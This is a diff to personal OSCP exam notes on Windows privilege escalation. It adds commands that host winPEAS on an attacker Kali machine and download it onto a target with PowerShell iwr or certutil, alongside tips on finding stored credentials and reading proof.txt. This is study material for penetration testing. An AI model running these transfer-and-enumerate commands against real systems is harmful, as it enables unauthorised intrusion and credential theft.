@@ -72,13 +72,41 @@ run `Invoke-AllChecks` to automatically find misconfigured services.
 | **Hardcoded cleartext credentials** (Config files, `.bash_history`) | **Registry / Unattended Installs**                  | Windows constantly leaves passwords in `C:\Windows\Panther\Unattend.xml` or stored deep in the Registry. `winpeas` will find these instantly.                                         |
 
 No Wget/Curl
+
+```
+cd ~/Desktop/Tools/PEAS && python -m http.server 80
+```
+
+Windows wget using InvokePowershell from Powershell
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `iwr -uri http://${KaliIP}/winpeas.exe -OutFile winpeas.exe`;
+const command = `iwr -uri http://${KaliIP}/winPEASx64.exe -OutFile winpeas.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Windows wget using InvokePowershell from Outside Powershell
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `powershell -c "iwr -uri http://${KaliIP}/winPEASx64.exe -OutFile winpeas.exe"`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+or
+
+Windows wget using certutil.exe
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -f -urlcache -split http://${KaliIP}/winPEASx64.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+winpeas.exe
+```
+
 Priv Esc
 
 [[SeImpersonatePrivilege]]
@@ -99,4 +127,23 @@ dir /s /b proof.txt
 
 ```
 type proof.txt
+```
+
+---
+
+Delete a file
+```
+del filename.txt
+```
+
+```
+del /f filename.txt
+```
+
+```powershell
+Remove-Item filename.txt
+```
+
+```powershell
+Remove-Item filename.txt -Force
 ```
